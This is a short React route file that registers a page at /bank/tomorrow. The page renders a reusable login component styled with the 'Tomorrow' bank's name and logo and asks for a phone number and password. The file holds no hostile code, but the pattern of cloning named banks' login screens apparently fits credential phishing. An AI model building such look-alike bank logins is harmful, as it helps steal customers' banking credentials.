import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/tomorrow")({
  head: () => ({ meta: [{ title: "Tomorrow — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="tmr" logoSlug="tomorrow" title="Tomorrow" field1Label="Telefonnummer" field2Label="Passwort" />
  ),
});
